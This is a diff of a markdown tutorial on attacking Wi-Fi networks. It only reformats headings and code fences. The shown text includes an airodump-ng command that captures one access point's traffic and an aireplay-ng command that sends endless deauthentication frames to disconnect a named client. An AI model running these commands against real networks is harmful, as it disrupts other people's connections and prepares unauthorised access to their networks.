@@ -43,9 +43,10 @@ ENC : Encrept protocol
 
 ESSID : the name of AP
 
-## in case the channel will change over time,set the stable channel 
-
+#### in case the channel will change over time,set the stable channel 
+```
 airodump-ng -c 11 -i wlan0 --bssid C4:71:54:23:2A:AE 
+```
 
 -c : channel number ,in this case , i choose 11
 
@@ -55,7 +56,7 @@ airodump-ng -c 11 -i wlan0 --bssid C4:71:54:23:2A:AE
 
 this command only show the traffic between client and target AP
 
-## attack target by using aireplay-ng
+## 3. attack target by using aireplay-ng
 ```
 aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
 ```
